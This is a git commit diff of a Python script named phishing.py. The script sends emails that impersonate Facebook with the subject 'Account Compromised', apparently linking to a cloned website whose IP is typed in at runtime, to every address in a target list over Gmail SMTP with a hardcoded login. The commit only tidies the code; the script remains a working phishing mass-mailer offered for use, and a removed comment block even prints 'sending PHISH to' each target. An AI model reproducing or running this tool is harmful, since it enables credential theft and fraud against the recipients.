6d356c064304e5eed0473dbd025f318be279779f
Danny-Trinh <dtrinh403@yahoo.com>
2021-05-03 16:24:54 -0500

    last commit

--- phishing.py
+++ phishing.py
@@ -9,23 +9,11 @@ password = "ThisIsThePassword!"
 
 
 IP = input("Enter IP of cloned website: ")
-# server = smtplib.SMTP("smtp.gmail.com", 587)
-
-# server.starttls()
-# server.login(sender, password)
-
-####################################################
-
 
 message = MIMEMultipart("alternative")
 message["Subject"] = "Account Compromised"
 message["From"] = "Facebook"
-# Create the plain-text and HTML version of your message
-text = """
-Hi,
-How are you?
-Real Python has many great tutorials:
-www.realpython.com"""
+text = ""
 html = f"""\
 <html>
   <body>
@@ -39,16 +27,12 @@ html = f"""\
   </body>
 </html>
 """
-
 part1 = MIMEText(text, "plain")
 part2 = MIMEText(html, "html")
-
-
 message.attach(part1)
 message.attach(part2)
-
-
 context = ssl.create_default_context()
+
 targetEmails = open("emailList.txt")
 with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
     server.login(sender, password)
@@ -61,24 +45,3 @@ with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
         
 
 
-
-
-#################################
-
-# email_body = """From: MarcusSwe8080@gmail.com
-# To: hi@hi.com
-# Subject: Not a fishing email?\n
-
-# Chad sent you 50 lures!
-# '<a href="www.google.com">abc</a>'
-
-# """
-# message = MIMEText(email_body, 'html')
-# targetEmails = open("emailList.txt")
-
-# for email in targetEmails:
-#     print("sending PHISH to " + str(email))
-#     server.ehlo
-#     server.sendmail(sender, email, message)
-
-#################################
